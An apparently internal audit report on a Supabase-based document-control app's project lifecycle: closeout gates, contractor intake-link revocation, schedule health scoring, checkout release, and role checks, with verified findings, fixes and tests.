# 01 · The project model, membership & lifecycle

**15 findings** — 8 HIGH · 7 MEDIUM (`PM-15` opened by projects Round G, 2026-09-30, splitting `PM-10` per `DEC-31`).

The server behaviour beneath the already-audited tabs.

> Each finding survived an adversarial verification pass: a second agent read the
> cited code and tried to refute it. Refuted findings were dropped. A severity set
> by that pass overrides the original.


### Already there — substrate and sound invariants

| Thing | Where | Why it matters |
|---|---|---|
| The 20260913 recursion-breaking SECURITY DEFINER helpers (is_project_member, project_org, is_project_owner, project_visible_to_me) are all declared `STABLE SECURITY DEFINER SET search_path = public` and are the single source of the project visibility rule. | `supabase/migrations/20260913_projects_rls_recursion_fix.sql:21-59` | They terminate the projects↔project_members policy cycle that returned 42P17/HTTP 500 on every project query. Any new policy that re-inlines `EXISTS (SELECT 1 FROM project_members …)` into a projects policy re-opens the recursion. Private-project visibility must keep flowing through project_visible_to_me(). |
| lib/exampleProject.ts is pure and deterministic — buildExampleCostData() returns a literal and is consumed only by components/projects/cost/CostCharts.tsx:65 (inside an `if (!hasRealData)` branch wrapped in <ExampleFrame>) and lib/__tests__/projectControls.test.ts. There is no seed/demo script in scripts/ or fixtures/. | `lib/exampleProject.ts:1-109; components/projects/cost/CostCharts.tsx:63-107` | Demo/example data genuinely cannot contaminate a real org — it is never inserted, and it is only rendered when the project has no real cost rows. The hunt-item 'can demo data reach real orgs' is clean today; keep the example dataset out of any code path that writes. |
| enforce_checkout_release_guard: a BEFORE UPDATE trigger on checkout_sessions that refuses to let a non-controller close another user's active session, and exempts the service role (`IF auth.uid() IS NULL THEN RETURN NEW`). | `supabase/migrations/20260831_capability_policy_and_rails.sql:80-101` | This is the correct control and must not be weakened to fix the project-closeout bug below — the fix belongs on the caller side (per-row release + error handling + a controller/service path), not by loosening who may release someone else's lock. |
| reconcileDocumentCheckoutState is called per-document after every bulk release, replacing the old blanket column-clear on documents. | `lib/projects.ts:404-414, 1084-1096` | It is what stops a project-scoped release from freeing documents that other users still hold outside the project. Any rewrite of releaseAllCheckoutsForProject must keep the per-document settle. |
| computeProjectHealth excludes null-scoring parts from the composite rather than treating missing data as perfect or as failing. | `lib/projectHealth.ts:142-147` | An honest headline score. The over/under-budget curve at lib/projectHealth.ts:82 is also continuous across the 100% line so going over can never score above staying under — both properties are easy to break in a refactor. |
| MembersTab.addByEmail resolves the invitee through org_members (org_id + uid + status='active') before calling addMember, not through the global users table. | `app/(protected)/projects/[id]/page.tsx:870-880` | This app-side check is the ONLY thing stopping a stranger being attached to a project roster — project_members_write RLS does not verify that user_id is an org member (supabase/migrations/20260913_projects_rls_recursion_fix.sql:80-86). |
| IntakePanel.reject marks document_versions.review_state='rejected' first and only clears documents.pending_version_id if that write succeeded. | `components/projects/IntakePanel.tsx:250-262` | Ordering that prevents a half-completed rejection (doc unblocked, version stuck 'in_review') — the exact defect 20260906 was written to fix. |


---


<a id="pm-1"></a>

## PM-1 · Closeout is a label, not a gate: completed/cancelled/archived projects stay fully writable, and their external contractor upload tokens keep publishing controlled revisions

- **Severity:** HIGH
- **Status:** OPEN
- **Verification:** CONFIRMED
- **Locations:** `lib/projects.ts:259-318`, `app/api/intake/upload/route.ts:35-42`, `app/api/intake/upload/route.ts:225-228`, `app/api/intake/upload/route.ts:299-334`, `app/(protected)/projects/[id]/page.tsx:625-653`, `supabase/migrations/20261013_project_controls_program.sql:262-288`, `supabase/migrations/20260902_project_intake.sql:51-60`
- **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Survives. Verified as a claim of absence: grep across lib/, app/ and components/ finds no closed-project write guard of any kind, and the intake door never loads projects.status. A cancelled project's trusted link still auto-supersedes a controlled drawing to Issued.

**Mechanism.** Nothing anywhere reads projects.status before a write. Two differently-shaped searches (`grep -rn 'projectStatus|status === "archived"|status === "completed"|status === "cancelled"' components/projects lib/costs.ts lib/turnover.ts lib/checklists.ts lib/changeOrders.ts lib/milestones.ts` and `grep -rniE "status = 'archived'|status IN ('completed'" supabase/migrations/*.sql`) return zero write-gating hits: the only matches are milestone status strings and a display badge. No RLS policy, no trigger, no lib guard references project status. So after 'Complete'/'Cancel'/'Archive' a project still accepts new cost_entries, change_orders, checklist_items, turnover acceptance, punch closures, milestones, members, ownership transfer and comments.

Worse, the external door stays open. transitionProjectStatus never touches project_intake_links, and /api/intake/upload validates only the token's own `revoked_at` / `expires_at`:

```ts
if (link.revoked_at) return bad("This link has been revoked.", 410);
if (link.expires_at && Date.parse(link.expires_at as string) < Date.now()) return bad("This link has expired.", 410);
```

The project is then fetched only to check existence and read its intake library (line 225-228). For a trusted link submitting a revision of a document it authored, `autoNow` is true and the route writes `documents.status = "Issued"`, sets `current_version_id`, and supersedes the prior version — on a cancelled project.

The UI is explicit that the gates are advisory: 'You can complete anyway — the open items stay on the record and in the report.' (page.tsx:648). That is a defensible product choice for the four listed gates; what is not defensible is that COMPLETION changes nothing at all about who may still write the project's regulated record.

**Failure scenario.** A repipe project is cancelled after the MOC is withdrawn. Its trusted intake link for 'Gulf Mechanical' was never revoked (revocation is a separate manual click in the Intake tab, and the Intake tab is hidden to non-managers). Two weeks later the contractor uploads 'Rev C' of an ISO they previously submitted. The route publishes it: documents.status='Issued', current_version_id points at an external-provenance version, the prior current version is stamped superseded. The current controlled revision of a drawing now originates from a cancelled project, authored by an outside party, with no internal review — and the field prints it as current. Separately, anyone can still post cost entries and mark turnover items 'accepted' on a project that was closed out months earlier, after the closeout snapshot was taken.

**Evidence.**

```
lib/projects.ts:259-318 (transitionProjectStatus) writes status/completed_at/cancelled_at, writes activity + audit, releases checkouts, notifies — and does nothing to project_intake_links. app/api/intake/upload/route.ts:302: `const autoNow = !!docId && !!link.allow_auto_supersede && linkAuthored;` then :324-326 `update({ current_version_id: versionId, rev: revLabel || "A", revision: revLabel || "A", status: "Issued", pending_version_id: null, ... })`. The project row is read at :225-227 selecting only `id, name, owner_user_id, intake_library_id, intake_collection_id` — status is not even selected.
```

> **Verifier correction.** Severity downgraded to HIGH and scope narrowed. The four closeout gates being advisory is explicit product intent (page.tsx:648) and the finding concedes that. The residual real defect is narrower than 'completion changes nothing': transitionProjectStatus never revokes or expires project_intake_links, so an external token survives closeout — but publishing a superseding 'Issued' revision still requires a link with allow_auto_supersede=true submitting a revision of a document that link itself authored (`const autoNow = !!docId && !!link.allow_auto_supersede && linkAuthored;`), and controllers/owners can still revoke the link by hand (project_intake_links_write, 20260902:51-60). The org-side write surface (costs, checklists, punch, members) staying open after closeout is confirmed but is a missing feature, not an external exposure.

**Done when.**

- [ ] completing / cancelling / archiving a project auto-revokes (or suspends) its project_intake_links, and /api/intake/resolve + /api/intake/upload reject a token whose project is not in a writable status, with a message the contractor can act on
- [ ] writes to the project's regulated record (cost_entries, change_orders, checklist_items, turnover_items, punch_items, milestones) on a completed/cancelled/archived project are refused at the DB layer — an RLS predicate or trigger on project status, not a client check — with an explicit controller-only 'reopen' transition that is audited
- [ ] reopening a project (status → active) is a distinct audited action that clears completed_at / cancelled_at / cancelled_reason rather than leaving them set
- [ ] a test covers: project cancelled → intake upload with a trusted link → refused, and documents.current_version_id unchanged

**Partial (2026-09-30, projects Round G).** The project side landed (package J8 / PC-2; `DEC-44`); the door's own refusal is PC-1 / J1's and is not done here.
- Closing revokes the door: `transitionProjectStatus` (`lib/projects.ts`) revokes every live `project_intake_links` row of the project when it moves to completed / cancelled / archived — BEFORE the status changes (fail safe: a refused revocation leaves the project open and says so) — and records `revokedIntakeLinks` in the `PROJECT_<STATUS>` audit row. A revoked link is refused by the upload and resolve routes' existing check (`app/api/intake/upload/route.ts:42` `if (link.revoked_at) return bad("This link has been revoked.", 410)`), before anything is written. `delete_project_record` revokes too (`supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql`). `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql`'s foot carries the statement (commented, run after reviewing the inventory row) that revokes links left open by closures made before this.
- The regulated record freezes at the database: `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql` `enforce_project_record_guard`, BEFORE INSERT / UPDATE / DELETE on cost_entries, change_orders, cost_documents, cost_accounts, project_checklists, checklist_items (through its checklist), turnover_items, punch_items, milestones — a signed-in write on a completed / cancelled / archived project is refused ("…records are read-only. An Admin / Document Control can reopen it."). The service role keeps its pass (house rule; the intake door is J1's).
- Reopening is a distinct, audited, controller-only act: `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql` `reopen_project(project, reason)` — controller-only, reason required, sets `active` and CLEARS `completed_at` / `cancelled_at` / `cancelled_reason`, writes the feed row and `PROJECT_REOPENED` (previous status and the cleared values in details), one transaction; `enforce_project_lifecycle_guard` refuses any other way out of a closed status (only the RPC sets `app.project_reopen = 'project:<id>'`). `lib/projects.ts` `reopenProject` calls it; `transitionProjectStatus` refuses closed → open; the page offers Reopen to a controller on a closed project, with a reason prompt.
- Commits: `7ca202f`, `e0c1aa2`, `9363ebb`
- Tests: `projects.test.ts` "PM-1 — closing closes the door; reopening is a controller's audited act" (revocation before the status write, refused revocation leaves it open, pause revokes nothing, closed → active refused, reopen RPC / reason / missing-migration message); `projectRailsMigration.test.ts` "20261103 — PM-1: the freeze and the reopen".
- Pending migration: `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql` (inventory: closed projects; regulated rows on them; closed projects with un-revoked links).

**Done-when.**
- Closing auto-revokes the project's intake links — ✓; and /api/intake/resolve + /api/intake/upload reject a token whose project is not in a writable status — **not done here** (PC-1 / J1: the routes read no project status; a link minted on a closed project after closure would still be accepted — `project_intake_links` is not in this package's freeze).
- Writes to the regulated record on a closed project are refused at the DB layer, with a controller-only audited reopen — ✓ (`supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql`, pending apply).
- Reopening clears completed_at / cancelled_at / cancelled_reason and is audited — ✓.
- A test covers project cancelled → trusted-link upload refused, current_version_id unchanged — **partly**: `projects.test.ts` pins that cancelling revokes the link; the route test (upload with that link → 410, no write) belongs with J1's route rebuild, which is rewriting that file now.

**Scope / residual.** The closes-by-status check in both intake routes, and a refusal to mint a link on a closed project, are PC-1 / J1's (their migration 20261104 owns `project_intake_links`).

---

<a id="pm-2"></a>

## PM-2 · Deleting a project does not revoke its contractor upload tokens — project_intake_links has no FK to projects, so live external links survive and keep serving the assigned-document register

- **Severity:** HIGH
- **Status:** OPEN
- **Verification:** CONFIRMED
- **Locations:** `supabase/migrations/20260902_project_intake.sql:18-34`, `lib/projects.ts:597-617`, `app/api/intake/resolve/route.ts:34-46`, `app/api/intake/resolve/route.ts:105-120`, `app/api/intake/upload/route.ts:64-92`
- **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Survives. Both halves confirmed by repo-wide search: no FK, no cascade, no cleanup in deleteProject. The link keeps resolving and keeps listing the assigned documents' numbers/titles/revs; uploads do fail ("Project not found.", route.ts:227), but the org has also lost the only UI that could revoke the link, since the Intake tab lived on the deleted project page.

**Mechanism.** project_intake_links declares `project_id UUID NOT NULL` with no REFERENCES clause — verified by reading the CREATE TABLE and by `grep -rn 'project_intake_links' supabase/migrations/*.sql | grep -i 'constraint|references|foreign'`, whose only hit is the reverse direction (cost_documents.intake_link_id → project_intake_links). So the cascade that clears everything else leaves intake links behind, and deleteProject never touches the table.

/api/intake/resolve then still answers the token: it looks the link up by token, checks only revoked_at/expires_at, and falls back gracefully when the project is gone — `projectName: (project?.name as string | null) ?? "Project"`. The register it returns is built from `link.assigned_doc_ids` plus the link's own submissions, and those documents were NOT deleted (documents have no FK to projects). So the outside company keeps a working portal listing org document numbers, titles, revs and statuses.

/api/intake/upload's quote branch also runs entirely BEFORE the project existence check at line 225-228: it writes the file to R2 (line 72-81) and only then fails on the cost_documents FK — leaking an orphan R2 object on every attempt.

**Failure scenario.** A cancelled project is deleted to tidy the list. The contractor's /submit/<token> page still loads, still shows 'Project', and still lists the six controlled drawings that were assigned to them — document numbers, titles and current revisions — indefinitely, to a party whose engagement ended. Nobody in the org can even see the link any more: IntakePanel only lists links for a project that still exists, and project_intake_links_select is `is_org_controller(org_id) OR is_project_owner(project_intake_links.project_id)` — is_project_owner returns false for a deleted project, so a non-controller can never find it to revoke it.

**Evidence.**

```
20260902_project_intake.sql:20-21: `org_id UUID NOT NULL,` / `project_id UUID NOT NULL,` — both bare, no REFERENCES (contrast every other table in the repo). app/api/intake/resolve/route.ts:45-46 reads the project with `.eq("id", link.project_id)` and never branches on it being null; :74 `projectName: (project?.name as string | null) ?? "Project"`. lib/projects.ts:604-610 contains no project_intake_links statement. Revocation visibility: 20260913_projects_rls_recursion_fix.sql:100-102.
```

> **Verifier correction.** 'Leaks an orphan R2 object on every attempt' applies only to links whose project has been deleted (cost_documents.project_id is NOT NULL REFERENCES projects ON DELETE CASCADE, 20260819:182, so the insert is what fails). For a live project the object is referenced normally.

**Done when.**

- [ ] project_intake_links.project_id carries `REFERENCES projects(id) ON DELETE CASCADE` (after backfilling/cleaning any already-orphaned rows), or deleteProject revokes and deletes the project's links explicitly
- [ ] /api/intake/resolve and /api/intake/upload return a definite 'this link is no longer valid' when the project row is missing, instead of falling back to a generic 'Project'
- [ ] the quote branch of /api/intake/upload validates the link's project before writing bytes to R2
- [ ] an operational query exists for orphaned intake links (project_id with no matching project) and is run once against production

---

<a id="pm-3"></a>

## PM-3 · Imported (P6 / MS Project / CSV) schedules are invisible to the health score, the coach and the printed report — which prints 'No schedule loaded' for a project the Schedule tab shows as fully scheduled

- **Severity:** HIGH
- **Status:** RESOLVED
- **Verification:** CONFIRMED
- **Locations:** `lib/projectSnapshot.ts:49`, `lib/projectSnapshot.ts:114-121`, `lib/projectReport.ts:54`, `lib/projectReport.ts:146-152`, `components/projects/ScheduleTab.tsx:94,122-125`, `supabase/migrations/20260614_phase7_milestones.sql:57-61`, `components/projects/ScheduleImportModal.tsx:156`
- **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Survives. The two consumers demonstrably disagree in-code, so this is an inconsistency rather than a deliberate policy: a fully imported P6 schedule shows on the Schedule tab with its overdue count while health scores it as absent, the coach permanently nags "Add a schedule", and the printed report asserts "No schedule loaded."

**Mechanism.** Both the snapshot and the report filter milestones identically:

```ts
const live = msRows.filter((m) => (m.source as string | null) == null || m.source === "manual" || m.source === "app");
```

The legal value set is `CHECK (source IN ('manual','p6','msproject','csv'))` with `DEFAULT 'manual'` and NOT NULL — so `'app'` is not a value any row can hold (dead branch), `== null` never matches, and the filter reduces to `source = 'manual'`. The import writes `source: FORMAT_TO_SOURCE[parseResult.format]`, i.e. p6/msproject/csv. Every imported task is therefore excluded from `milestoneCount`, `overdueMilestones`, `hasBaseline`, and the report's entire Schedule section.

The Schedule tab takes the opposite position, deliberately: it loads `listMilestones({ orgId, projectId, includeGhost: true })` and states 'Metrics still computed over ALL milestones — ghost rows ARE commitments'. So the same project has a schedule on one screen and no schedule on another.

Compounding it, `spi: null` is hardcoded in the snapshot ('needs the schedule tab's EV math + history; null stays honest'), which makes the SPI branch of computeProjectHealth (`s.spi != null ? clamp(s.spi * 100) : null`, projectHealth.ts:91-98) permanently dead and makes the coach's promise 'Unlocks the execution board, overdue alerts, and schedule health (SPI)' (projectHealth.ts:178) unachievable — the EV/SPI math already exists in lib/milestones.ts.

**Failure scenario.** A capital project's schedule is imported from the contractor's P6 file — 400 activities, 12 of them overdue. The Schedule tab shows the execution board and the overdue count. The health strip says 'Schedule — No schedule yet' and scores the project only on cost, and the coach permanently nags 'Add a schedule — import a file or type a few milestones' at weight 95, above everything else, forever. The owner clicks Report for the monthly review and hands the boss a page that says, under Schedule: 'No schedule loaded.' — for a job that is twelve activities late.

**Evidence.**

```
lib/projectSnapshot.ts:49 and lib/projectReport.ts:54 are byte-identical filters. Value set: 20260614_phase7_milestones.sql:60-61 `source TEXT NOT NULL DEFAULT 'manual' CHECK (source IN ('manual','p6','msproject','csv'))`. Opposing treatment: components/projects/ScheduleTab.tsx:94 `const list = await listMilestones({ orgId, projectId, includeGhost: true });` and :122-124 'Metrics still computed over ALL milestones — ghost rows ARE commitments from the'. Import: ScheduleImportModal.tsx:156 `source: FORMAT_TO_SOURCE[parseResult.format],`. SPI: lib/projectSnapshot.ts:120 `spi: null, // needs the schedule tab's EV math + history; null stays honest`.
```

> **Verifier correction.** The quoted CHECK is stale: 20260703_milestones_hierarchy.sql:39-42 drops and re-adds it as `CHECK (source IN ('manual','p6','msproject','csv','mpxj'))`. 'mpxj' is excluded by the same filter, so the conclusion is unchanged and slightly broader.

**Done when.**

- [ ] the snapshot and report either include ghost rows (matching the Schedule tab's stated position that they are commitments) or explicitly report them separately — the report never says 'No schedule loaded' for a project that has imported milestones
- [ ] the dead `m.source === "app"` branch and the impossible `== null` clause are removed, and the milestone-liveness predicate lives in ONE shared helper used by projectSnapshot, projectReport and the Schedule tab
- [ ] spi is computed from the existing earned-value code in lib/milestones.ts and fed into the snapshot, so the SPI branch of computeProjectHealth and the coach's stated payoff become real — or the coach's payoff text stops promising SPI
- [ ] a test builds a project whose only milestones have source='p6' and asserts milestoneCount > 0, overdueMilestones is correct, and the rendered report contains the milestone table

**Resolution (2026-09-29, projects Round G).** Closed with projects-tab `MON-6` (same package, same pass) — that record carries the file-level detail. Package default taken: imported/ghost rows are commitments everywhere; SPI is computed rather than the payoff removed. New `lib/milestoneLiveness.ts` is the ONE predicate (`isLiveMilestone` / `liveMilestones` / `isImportedMilestone` / `isOverdueMilestone`); `lib/projectSnapshot.ts`, `lib/projectReport.ts` and — by one import — `components/projects/ScheduleTab.tsx` use it. The snapshot maps its rows into `computeScheduleMetrics` (`lib/milestones.ts`, imported only, per `DEC-31`) and reports `spi` (null while planned value is 0), so `computeProjectHealth`'s SPI branch and the coach's "(SPI)" payoff are real. The report prints the milestone table for an imported-only project and never says "No schedule loaded" for it. `s.committed` is populated (`rollup.committed`) and the Cost part's detail reads it ("40% of budget spent · 60% committed") — the `COST-2` consumer; once PC-7's exposure figure lands it is a one-line read. Tests: `lib/__tests__/projectSnapshot.test.ts` ("a project whose only milestones are source='p6' has a real count, overdue and SPI"; "SPI stays null … while nothing is due yet"; "every stored source counts…"), `lib/__tests__/projectReport.test.ts` ("an imported-only project prints the milestone table, never 'No schedule loaded'"), `projectControls.test.ts` ("the Cost part reads committed exposure…"). Reproduced against `8276cad` before editing: the new tests failed there (13 of 45 across `projectReport.test.ts` / `projectControls.test.ts`; `projectSnapshot.test.ts` could not even load — `lib/milestoneLiveness.ts` did not exist and the filter at `projectSnapshot.ts:49` was the manual-only one quoted above).

**Done-when.**
- The snapshot and report include ghost rows; the report never says "No schedule loaded" for a project with imported milestones — ✓.
- The dead `"app"` branch and the impossible `== null` clause are removed, and the predicate lives in ONE shared helper used by projectSnapshot, projectReport and the Schedule tab — ✓ (`lib/milestoneLiveness.ts`).
- `spi` is computed from `lib/milestones.ts` and fed into the snapshot so the SPI branch and the coach's payoff become real — ✓.
- A test builds a project whose only milestones have `source='p6'` and asserts `milestoneCount > 0`, `overdueMilestones` correct, and the rendered report contains the milestone table — ✓ (the count/overdue/SPI assertions in `projectSnapshot.test.ts`; the rendered table in `projectReport.test.ts`).

**Scope / residual.** `DEC-47`. `lib/milestones.ts` untouched (PC-3/J6).

---

<a id="pm-4"></a>

## PM-4 · Project closeout silently fails to release other people's checkouts — the bulk UPDATE is aborted by the release-guard trigger, the error is never read, and the UI and notification both claim the locks were freed

- **Severity:** HIGH
- **Status:** RESOLVED
- **Verification:** CONFIRMED
- **Locations:** `lib/projects.ts:371-415`, `lib/projects.ts:389-399`, `lib/projects.ts:300-317`, `supabase/migrations/20260831_capability_policy_and_rails.sql:80-101`, `app/(protected)/projects/[id]/page.tsx:619-623`, `lib/projects.ts:1039-1045`, `app/api/cron/maintenance/route.ts:88-92`
- **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Survives at HIGH. I specifically checked the refutation that RLS would silently drop the drafter's rows before the trigger fires — it does not, the policy is org-scoped FOR ALL, so the trigger sees them and raises. And no sweep repairs it later: autoReleaseExpiredAdHoc filters `.is("project_id", null)` (lib/projects.ts:1044), so project-linked checkouts are the one class the maintenance cron never touches.

**Mechanism.** transitionProjectStatus() calls releaseAllCheckoutsForProject() for completed/cancelled/archived. That helper issues ONE bulk statement:

```ts
await supabase
  .from("checkout_sessions")
  .update({ status: "checked_in", ended_at: now, released_at: now, released_by: params.actorUserId, released_reason: params.reason })
  .in("id", ids)
  .eq("status", "active");
```

No `const { error }` — the result is discarded. But every row of that statement passes through `trg_checkout_release_guard` (BEFORE UPDATE, FOR EACH ROW):

```sql
IF OLD.status = 'active' AND NEW.status IS DISTINCT FROM OLD.status
   AND OLD.user_id::text <> auth.uid()::text
   AND NOT is_org_controller(OLD.org_id) THEN
  RAISE EXCEPTION 'Only Admin/Document Control can release another user''s checkout.'
```

A project owner need not be a controller — `projects_insert_member` lets any active org member create a project and become its owner (20260906_projects_hardening.sql:56-59). So when a non-controller owner completes/cancels their project and ANY attached active checkout belongs to a different user, the trigger raises, the whole statement aborts, and NOT ONE row is released — including the owner's own sessions in the same batch. Execution then continues normally: the status/audit/activity writes already committed, and lib/projects.ts:316 sends the audience `"Any active checkouts on the project were released."` while the confirm modal already promised `"Every active checkout on this project will be released."` (page.tsx:621).

**Failure scenario.** Pipefitting turnaround project owned by an Engineer (not Admin/DocCtrl). Three ISO drawings are checked out under it — two by a drafter, one by the owner. The job is cancelled; the owner clicks Cancel, types a reason, sees 'Every active checkout on this project will be released', and the project flips to CANCELLED. Every one of the three checkouts is still `status='active'`, `documents.checked_out_by` still set, `current_lock_id` still held. Because project-tied checkouts are created with `auto_expires_at = null` (lib/projects.ts:918,960) and the sweep filters `.is("project_id", null)` (lib/projects.ts:1043), the cron NEVER releases them — /api/cron/maintenance only escalates a 14-day nag. Three controlled drawings stay locked against a cancelled project forever, and the drafter who holds two of them was told they were freed.

**Evidence.**

```
lib/projects.ts:389-399 is a bare `await supabase.from("checkout_sessions").update({...}).in("id", ids).eq("status","active");` with no error binding, immediately after `if (!active || active.length === 0) return;`. The guard at 20260831_capability_policy_and_rails.sql:89-93 raises for exactly `OLD.user_id <> auth.uid() AND NOT is_org_controller(OLD.org_id)`. lib/projects.ts:918: `const autoExpiresAt = project ? null : new Date(Date.now() + 24*60*60*1000).toISOString();` and lib/projects.ts:1043: `.is("project_id", null)`.
```

> **Verifier correction.** Severity downgraded to HIGH. The failure is fail-closed, not fail-open: because the whole statement aborts, the sessions stay `active` and the subsequent reconcileDocumentCheckoutState (lib/projects.ts:404-414) settles each document from its still-active sessions, so the documents remain correctly locked. Nothing unapproved is released into anyone's hands; the harm is stale locks plus a demonstrably false confirmation and notification, which is HIGH, not CRITICAL.

**Done when.**

- [ ] releaseAllCheckoutsForProject binds and inspects the update error and propagates a real failure to the caller instead of discarding it
- [ ] the release runs per-session (or through a SECURITY DEFINER RPC / service-role route) so one non-releasable session cannot abort the whole batch, and sessions the actor may not release are reported back to the UI as 'still held by X'
- [ ] transitionProjectStatus does not claim checkouts were released unless the release actually reported the released ids; the confirm modal and the notification body reflect the real outcome
- [ ] a project checkout stranded on a completed/cancelled/archived project is reachable by the maintenance sweep (or an explicit controller action), so no document stays locked to a closed project indefinitely
- [ ] a test covers: non-controller owner + another user's active checkout + transition to 'cancelled' → either all sessions released or an explicit error surfaced, never a silent no-op

**Resolution (2026-09-30, projects Round G).** Reproduced on the DC P6 CHECKOUT version (`2a2ae73`): `releaseAllCheckoutsForProject` was already checked (DCK-9) but still ONE batch UPDATE, so a single release-guard refusal left every session active, the actor's own included — DCK-9's own residual. Now (`lib/projects.ts`): the actor's own sessions end in one statement (the guard never refuses those; a failure there throws); every other session is released on its own, so a refusal holds only that session, which comes back in `stillHeld` with its holder (`{ released, releasedSessionIds, stillHeld }` — `DEC-44`). The authority is the release guard's, unchanged — a controller (anyone holding `checkout.force_release`) releases everyone's. `force_release_document` (20261043) is deliberately NOT used: it ends every active session on the document, including sessions held outside this project, which the per-document settle (a "verified sound" invariant, kept) exists to protect. `transitionProjectStatus` builds the notice body and `releaseError` from the real outcome (`describeReleaseOutcome`: "2 active checkouts were released; 1 is still held by ann."); the confirm copy no longer promises "Every active checkout … will be released". The sweep (`autoReleaseExpiredAdHoc`) also releases a project checkout still active on a project closed more than 24h (`CLOSED_PROJECT_SWEEP_MS`) — same `auto_released` outcome and CHECK_IN rows, its own reason and notice; the page-load path sweeps only the caller's own.
- Commits: `7ca202f`, `9363ebb`
- Tests: `projects.test.ts` "PM-4 — the project release is per session…" (own in one statement, others one each, a refusal holds only itself; a non-controller owner still frees their own; notice and message from the real outcome), "PM-4 dw4 — the sweep releases checkouts stranded on a closed project, after 24h"; `checkoutRoundF.test.ts` DCK-9 cases updated to the per-session contract (refusal of another user's session → still held; refusal of the actor's own → thrown).

**Done-when.**
- Binds and inspects the update error and propagates a real failure — ✓.
- Per-session release; sessions the actor may not release are reported as "still held by X" — ✓.
- No claim of release unless the release reported the released ids; confirm and notification reflect the real outcome — ✓.
- A checkout stranded on a closed project is reachable by the sweep — ✓ (24h after closure).
- A test covers non-controller owner + another user's active checkout + cancel → an explicit outcome, never a silent no-op — ✓.

**Scope / residual.** None. *Fix pass (2026-09-30):* the first cut of the stranded sweep measured the 24h from `projects.updated_at`, which any later edit to a closed project moves (a transfer or a description change restarted the window), and read unbounded — every active project-tied session in one request (silently capped at PostgREST's 1,000 rows) and every distinct project id in ONE `.in("id", …)` (in cron mode across every org, a request line long enough to be refused on every run). `strandedClosedProjectSessions` (`lib/projects.ts`) now measures from the CLOSURE — the earliest of `completed_at` / `cancelled_at`; for an archived project carrying neither, its newest closing `status_changed` feed row; `updated_at` only when neither exists (it is never earlier than the closure, so it can delay a release, never hasten one) — pages the session read in 1,000-row windows ordered by id, and reads the projects (and the archive feed rows) 100 ids per request. Tests: `projects.test.ts` "the window runs from the CLOSURE, not updated_at: a later edit to a closed project does not restart it; an archive reads its closing feed row", "the sweep's reads are bounded: sessions page past PostgREST's 1000-row cap, project ids go 100 per request".

---

<a id="pm-5"></a>

## PM-5 · assertCanManageProject reads only org_members.role and ignores the additive roles[] array, so users the UI and RLS both treat as controllers get 'Only the project owner or an admin can do this'

- **Severity:** MEDIUM
- **Status:** RESOLVED
- **Verification:** CONFIRMED
- **Locations:** `lib/projects.ts:580-595`, `supabase/migrations/20260814_documents_delete_controllers.sql:31-40`, `components/providers/RoleContext.tsx:198-213,364-370`, `app/(protected)/projects/[id]/page.tsx:65-68,131-134`
- **Independently verified:** ✓ **SURVIVES, corrected** — second independent adversarial pass. Severity **HIGH → MEDIUM** by this pass. The divergence is real and confirmed, but the illustrative scenario is not reachable. org_members.role is kept mirrored to the *highest-ranked* held role — admin/users/page.tsx:129,137 `const headline = primaryRole(cleaned); ... .update({ roles: cleaned, role: headline })` — and ROLE_RANK puts DocCtrl at 70 above every Engineer level (61-64, lib/roleCapabilities.ts:74-86), so a headline-'Engineer' member holding DocCtrl additively cannot be produced. The bug bites only when a role that outranks DocCtrl is the headline — Manager (90), Supervisor (80), DraftingSupervisor (75) — plus additive DocCtrl. It is also fail-closed (a legitimate controller is blocked, no privilege is gained), so MEDIUM rather than HIGH.

**Mechanism.** Three layers disagree about who is a controller.

DB (`is_org_controller`, the predicate behind every projects/cost/controls policy):
```sql
AND (role IN ('Admin', 'DocCtrl') OR roles && ARRAY['Admin', 'DocCtrl']::text[])
```

Client (`RoleContext`): the collection is `normalizeRoles(mem.roles, mem.role)` and `hasAnyRole: (rs) => rs.some((r) => roles.includes(r))`; the project page derives `const isAdmin = hasAnyRole(["Admin", "DocCtrl"]);` and `canManage = isOwner || isAdmin`.

Server helper (lib/projects.ts:588-594):
```ts
const { data: mem } = await supabase
  .from("org_members").select("role").eq("org_id", p.org_id).eq("uid", actorUserId).eq("status", "active").maybeSingle();
const role = (mem as { role?: string } | null)?.role;
if (role === "Admin" || role === "DocCtrl") { … }
throw new Error("Only the project owner or an admin can do this.");
```

It selects only the scalar `role` and hardcodes the facility vocabulary. A member with `role='Engineer'` and `roles=['Engineer','DocCtrl']` — precisely the additive shape the page comment at :66-67 describes ('a user holding Admin/DocCtrl additively gets admin powers here even if their headline role is something else') — is a controller to Postgres and to the UI, but not to this helper. assertCanManageProject gates transitionProjectStatus, removeMember, deleteProject, transferOwnership, updateMember and updateProjectMeta.

**Failure scenario.** A Document Control specialist whose headline role is 'Engineer' (DocCtrl held additively) opens someone else's project. The page shows Pause/Complete/Cancel/Archive/Edit/Delete and the Members tab's Remove and 'Make owner' controls, because hasAnyRole says they are a controller. Every one of those buttons throws 'Only the project owner or an admin can do this.' — even though RLS would have allowed the write. Nothing in the message hints at the cause, and it is not reproducible for an Admin whose headline role IS 'Admin', so it reads as a random bug. Conversely the audit trail records nothing, because the throw happens before any logAuditAction.

**Evidence.**

```
lib/projects.ts:589 `.select("role")` — the roles column is never fetched; :591 `if (role === "Admin" || role === "DocCtrl")`. Contrast 20260814_documents_delete_controllers.sql:38 quoted above, and lib/notify/recipients.ts:57-59 which DOES handle both: `const held = m.roles && m.roles.length > 0 ? m.roles : m.role ? [m.role] : [];`.
```

